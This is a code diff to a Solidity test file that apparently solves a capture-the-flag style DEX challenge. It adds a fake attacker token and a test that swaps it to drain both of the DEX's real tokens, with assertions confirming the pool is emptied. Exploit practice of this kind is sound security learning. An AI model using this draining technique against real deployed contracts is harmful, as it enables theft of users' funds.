@@ -3,6 +3,22 @@ pragma solidity ^0.8.13;
 
 import {Test, console2} from "forge-std/Test.sol";
 import {DexTwo, SwappableTokenTwo} from "../src/DexTwo.sol";
+import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+
+contract AttackDexTwoToken is SwappableTokenTwo {
+    constructor(
+        address dexInstance,
+        uint initialSupply
+    ) SwappableTokenTwo(dexInstance, "Attacker", "AA", initialSupply) {}
+
+    function approveSkipChecks(
+        address owner,
+        address spender,
+        uint256 amount
+    ) public {
+        ERC20._approve(owner, spender, amount);
+    }
+}
 
 contract DexTwoTest is Test {
     DexTwo public dex;
@@ -50,6 +66,34 @@ contract DexTwoTest is Test {
     }
 
     function test_Attack_Dex() public {
-        dex.approve(address(this), type(uint256).max);
+        dex.approve(address(dex), type(uint256).max);
+
+        AttackDexTwoToken token3 = new AttackDexTwoToken(
+            address(this),
+            1 ether
+        );
+
+        token3.approveSkipChecks(
+            address(this),
+            address(dex),
+            type(uint256).max
+        );
+
+        token3.transfer(address(dex), 100);
+        dex.swap(address(token3), address(token1), 100);
+        dex.swap(address(token3), address(token2), 200);
+
+        assertEq(token1.balanceOf(address(dex)), 0);
+        assertEq(token2.balanceOf(address(dex)), 0);
+        assertEq(token1.balanceOf(address(this)), 110);
+        assertEq(token2.balanceOf(address(this)), 110);
+    }
+
+    function swapAForB(uint amount) public {
+        dex.swap(address(token1), address(token2), amount);
+    }
+
+    function swapBForA(uint amount) public {
+        dex.swap(address(token2), address(token1), amount);
     }
 }
